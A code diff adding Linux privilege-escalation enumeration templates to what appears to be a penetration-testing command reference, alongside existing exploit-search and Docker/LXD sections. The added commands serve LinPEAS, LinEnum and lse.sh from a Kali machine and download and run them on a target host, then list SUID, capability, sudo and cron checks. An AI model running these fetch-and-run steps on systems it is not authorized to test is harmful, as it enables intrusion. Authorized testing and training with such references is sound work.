@@ -224,6 +224,39 @@ searchsploit linux kernel <version>
 `;
 
   // =========================================================
+  // AUTOMATED ENUMERATION
+  // =========================================================
+
+  linuxAutomatedEnum = `
+# On Kali: serve the scripts from the current directory
+python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0
+
+# On the authorized Linux host: download and run LinPEAS
+curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/linpeas.sh -o /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh -a | tee /tmp/linpeas.log
+
+# LinEnum (alternative, more lightweight)
+curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/LinEnum.sh -o /tmp/LinEnum.sh
+bash /tmp/LinEnum.sh -t
+
+# linux-smart-enumeration (lse.sh)
+curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/lse.sh -o /tmp/lse.sh
+chmod +x /tmp/lse.sh
+/tmp/lse.sh -l1
+`;
+
+  linuxManualVerify = `
+# LinPEAS highlights findings in color (red/yellow = interesting),
+# but every "possible" vector must still be confirmed manually:
+
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+crontab -l
+`;
+
+  // =========================================================
   // DOCKER / LXD
   // =========================================================
 
